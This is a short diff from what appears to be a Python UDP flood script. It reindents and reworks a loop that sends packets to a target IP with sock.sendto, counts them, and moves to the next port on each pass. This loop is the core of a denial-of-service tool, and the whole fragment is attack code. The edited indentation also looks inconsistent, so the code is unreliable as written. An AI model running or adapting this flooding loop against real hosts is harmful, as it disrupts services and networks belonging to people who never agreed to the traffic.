@@ -46,10 +46,8 @@ if data == "1":
     print (Fore.BLUE + "\nPls Wait...\n")
     time.sleep(4)
     sent = 0 
-
-while True:
-        try:
-
+    while True:
+       
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
